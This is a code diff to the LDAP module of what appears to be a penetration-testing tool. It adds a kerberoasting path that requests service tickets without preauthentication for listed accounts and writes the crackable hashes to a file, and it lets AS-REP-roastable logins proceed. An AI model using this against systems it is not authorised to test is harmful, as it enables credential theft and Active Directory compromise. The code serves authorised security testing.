@@ -347,7 +347,7 @@ class ldap(connection):
         self.logger.display(f"{self.server_os} (name:{self.hostname}) (domain:{self.domain}) ({signing}) ({cbt_status}) {ntlm}")
 
     def kerberos_login(self, domain, username, password="", ntlm_hash="", aesKey="", kdcHost="", useCache=False):
-        self.username = username if not self.username else self.username    # With ccache we get the username from the ticket
+        self.username = username if not self.args.use_kcache else self.username    # With ccache we get the username from the ticket
         self.password = password
         self.domain = domain
         self.kdcHost = kdcHost
@@ -413,7 +413,11 @@ class ldap(connection):
                 f"{domain}\\{self.username}{' account vulnerable to asreproast attack'} {''}",
                 color="yellow",
             )
-            return False
+            # If no preauth is set, we want to be able to execute commands such as --kerberoasting
+            if self.args.no_preauth:  # noqa: SIM103
+                return True
+            else:
+                return False
         except SessionError as e:
             error, desc = e.getErrorString()
             used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
@@ -985,6 +989,46 @@ class ldap(connection):
                         hash_asreproast.write(f"{hash_TGT}\n")
 
     def kerberoasting(self):
+        if self.args.no_preauth:
+            usernames = []
+            for item in self.args.no_preauth:
+                if os.path.isfile(item):
+                    with open(item, encoding="utf-8") as f:
+                        usernames.extend(line.strip() for line in f if line.strip())
+                else:
+                    usernames.append(item.strip())
+
+            skipped = []
+            hashes = []
+
+            for spn in usernames:
+                base_name = spn.split("/", 1)[0].split("@", 1)[0].rstrip()
+
+                if base_name.lower() == "krbtgt" or base_name.endswith("$"):
+                    skipped.append(base_name)
+                    continue
+
+                if not self.username:
+                    self.logger.fail("Likely executed without password flag. Please run the command with -p ''")
+                    return
+                hashline = KerberosAttacks(self).get_tgs_no_preauth(self.username, spn)
+                if hashline:
+                    hashes.append(hashline)
+
+            if skipped:
+                self.logger.display(f"Skipping account: {', '.join(skipped)}")
+            if hashes:
+                self.logger.display(f"Total of records returned {len(hashes)}")
+            else:
+                self.logger.highlight("No entries found!")
+
+            for line in hashes:
+                self.logger.highlight(line)
+                if self.args.kerberoasting:
+                    with open(self.args.kerberoasting, "a+", encoding="utf-8") as f:
+                        f.write(line + "\n")
+            return
+
         # Building the search filter
         searchFilter = "(&(servicePrincipalName=*)(!(objectCategory=computer)))"
         attributes = [
